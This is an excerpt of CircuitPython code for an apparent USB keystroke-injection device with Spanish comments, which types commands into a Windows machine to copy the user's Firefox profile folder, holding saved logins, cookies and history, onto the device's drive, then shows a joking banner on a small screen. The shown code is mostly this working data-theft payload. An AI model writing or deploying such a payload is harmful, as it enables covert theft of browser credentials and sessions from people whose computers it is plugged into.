...
from keyboard_layout_win_es import KeyboardLayout # Teclado en español
# from keyboard_layout_win_uk import KeyboardLayout # Teclado en inglés
...
try:
    ...
    time.sleep(2)
    keyboard_layout.write('cd AppData/Roaming/Mozilla')
    time.sleep(1)
    keyboard.send(Keycode.ENTER)
    time.sleep(1)
    keyboard_layout.write('robocopy Firefox D: /E /XD storage')
    time.sleep(1)
    keyboard.send(Keycode.ENTER)
    time.sleep(30)
...
draw_rectangle()
print_onTFT("ESPAM", 20, 30)
print_onTFT("VAMOS GANANDO", 20, 60)
print_onTFT("AL EMPATE CALCETA", 20, 90)
time.sleep(2)